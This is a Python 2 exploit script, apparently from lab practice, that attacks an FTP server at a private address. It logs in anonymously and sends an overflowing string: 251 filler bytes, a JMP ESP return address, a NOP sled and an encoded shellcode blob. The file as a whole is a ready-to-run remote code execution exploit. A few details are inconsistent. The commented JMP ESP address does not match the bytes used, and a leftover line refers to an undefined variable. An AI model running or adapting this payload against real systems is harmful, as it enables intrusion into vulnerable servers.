import socket
import time
import sys

# Bad Chars : \x00\x0a\x0d
# JMP ESP : 766CCAFF

pwn_code = (
"\xbe\xa0\xab\xea\x8b\xda\xc7\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x31\x77\x12\x03\x77\x12\x83\x67\xaf\x08\x7e\x9b\x58\x4e"
"\x81\x63\x99\x2f\x0b\x86\xa8\x6f\x6f\xc3\x9b\x5f\xfb\x81\x17"
"\x2b\xa9\x31\xa3\x59\x66\x36\x04\xd7\x50\x79\x95\x44\xa0\x18"
"\x15\x97\xf5\xfa\x24\x58\x08\xfb\x61\x85\xe1\xa9\x3a\xc1\x54"
"\x5d\x4e\x9f\x64\xd6\x1c\x31\xed\x0b\xd4\x30\xdc\x9a\x6e\x6b"
"\xfe\x1d\xa2\x07\xb7\x05\xa7\x22\x01\xbe\x13\xd8\x90\x16\x6a"
"\x21\x3e\x57\x42\xd0\x3e\x90\x65\x0b\x35\xe8\x95\xb6\x4e\x2f"
"\xe7\x6c\xda\xab\x4f\xe6\x7c\x17\x71\x2b\x1a\xdc\x7d\x80\x68"
"\xba\x61\x17\xbc\xb1\x9e\x9c\x43\x15\x17\xe6\x67\xb1\x73\xbc"
"\x06\xe0\xd9\x13\x36\xf2\x81\xcc\x92\x79\x2f\x18\xaf\x20\x38"
"\xed\x82\xda\xb8\x79\x94\xa9\x8a\x26\x0e\x25\xa7\xaf\x88\xb2"
"\xc8\x85\x6d\x2c\x37\x26\x8e\x65\xfc\x72\xde\x1d\xd5\xfa\xb5"
"\xdd\xda\x2e\x19\x8d\x74\x81\xda\x7d\x35\x71\xb3\x97\xba\xae"
"\xa3\x98\x10\xc7\x4e\x63\xf3\x28\x26\x20\x80\xc1\x35\xb6\x97"
"\x4d\xb3\x50\xfd\x7d\x95\xcb\x6a\xe7\xbc\x87\x0b\xe8\x6a\xe2"
"\x0c\x62\x99\x13\xc2\x83\xd4\x07\xb3\x63\xa3\x75\x12\x7b\x19"
"\x11\xf8\xee\xc6\xe1\x77\x13\x51\xb6\xd0\xe5\xa8\x52\xcd\x5c"
"\x03\x40\x0c\x38\x6c\xc0\xcb\xf9\x73\xc9\x9e\x46\x50\xd9\x66"
"\x46\xdc\x8d\x36\x11\x8a\x7b\xf1\xcb\x7c\xd5\xab\xa0\xd6\xb1"
"\x2a\x8b\xe8\xc7\x32\xc6\x9e\x27\x82\xbf\xe6\x58\x2b\x28\xef"
"\x21\x51\xc8\x10\xf8\xd1\xe8\xf2\x28\x2c\x81\xaa\xb9\x8d\xcc"
"\x4c\x14\xd1\xe8\xce\x9c\xaa\x0e\xce\xd5\xaf\x4b\x48\x06\xc2"
"\xc4\x3d\x28\x71\xe4\x17"
)

jmp_esp = '\xD0\x5E\x6F\x76'
nop_slides = '\x90' * 32
payload = 'A'*251 + jmp_esp + nop_slides + pwn_code

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.75.132', 21))
	s.recv(1024)
	s.send('USER anonymous\r\n')
	s.recv(1024)
	s.send('PASS anonymous\r\n')
	s.recv(1024)
	s.send(payload + '\r\n')
	s.recv(1024)
	s.send('QUIT\r\n')
	s.close()
	print("[*] Payload sent!")
	time.sleep(1)
	buffer = buffer + 'A'*100
except:
	sys.exit()